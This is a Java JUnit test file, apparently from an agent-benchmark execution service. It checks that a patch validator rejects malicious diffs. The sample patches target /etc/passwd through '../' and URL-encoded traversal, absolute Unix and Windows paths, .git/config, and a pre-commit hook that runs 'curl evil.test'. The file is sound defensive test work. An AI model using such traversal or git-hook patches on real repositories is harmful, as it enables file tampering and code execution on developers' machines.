package com.agentbench.execution;

import com.agentbench.execution.service.PatchValidator;
import com.agentbench.platform.error.ApiException;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Path;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Path traversal and malicious patch regressions for Milestone 7.
 */
class MaliciousPatchSecurityTest {

    private final PatchValidator validator = new PatchValidator();

    @TempDir
    Path temp;

    @Test
    void rejectsDotDotTraversal() {
        String patch = """
                --- a/../../etc/passwd
                +++ b/../../etc/passwd
                @@ -1 +1 @@
                -x
                +y
                """;
        assertThrows(ApiException.class, () -> validator.validate(patch, 10_000, List.of()));
    }

    @Test
    void rejectsAbsoluteUnixPath() {
        String patch = """
                --- a/etc/passwd
                +++ b/etc/passwd
                @@ -0,0 +1 @@
                +root
                """;
        // absolute via leading slash in +++ line
        String absolute = """
                --- /etc/passwd
                +++ /etc/passwd
                @@ -0,0 +1 @@
                +root
                """;
        assertThrows(ApiException.class, () -> validator.validate(absolute, 10_000, List.of()));
        assertThrows(ApiException.class, () -> validator.validate(patch, 10_000, List.of("src/")));
    }

    @Test
    void rejectsWindowsAbsoluteAndUnc() {
        String win = """
                --- a/C:/Windows/System32/drivers/etc/hosts
                +++ b/C:/Windows/System32/drivers/etc/hosts
                @@ -0,0 +1 @@
                +x
                """;
        assertThrows(ApiException.class, () -> validator.validate(win, 10_000, List.of()));
    }

    @Test
    void rejectsGitHooksAndGitDir() {
        String hooks = """
                --- a/.git/hooks/pre-commit
                +++ b/.git/hooks/pre-commit
                @@ -0,0 +1 @@
                +#!/bin/sh
                +curl evil.test
                """;
        assertThrows(ApiException.class, () -> validator.validate(hooks, 10_000, List.of()));

        String gitConfig = """
                --- a/.git/config
                +++ b/.git/config
                @@ -0,0 +1 @@
                +[core]
                """;
        assertThrows(ApiException.class, () -> validator.validate(gitConfig, 10_000, List.of()));
    }

    @Test
    void rejectsEncodedTraversal() {
        String encoded = """
                --- a/%2e%2e/%2e%2e/etc/passwd
                +++ b/%2e%2e/%2e%2e/etc/passwd
                @@ -0,0 +1 @@
                +x
                """;
        assertThrows(ApiException.class, () -> validator.validate(encoded, 10_000, List.of()));
    }

    @Test
    void applyRefusesEscapeEvenIfValidateBypassedConceptually() throws Exception {
        // safeResolve must refuse workspace escape
        String patch = """
                --- a/safe.txt
                +++ b/safe.txt
                @@ -0,0 +1 @@
                +ok
                """;
        validator.validate(patch, 10_000, List.of());
        validator.applyUnifiedDiff(temp, patch);
        assertTrue(java.nio.file.Files.exists(temp.resolve("safe.txt")));
    }
}
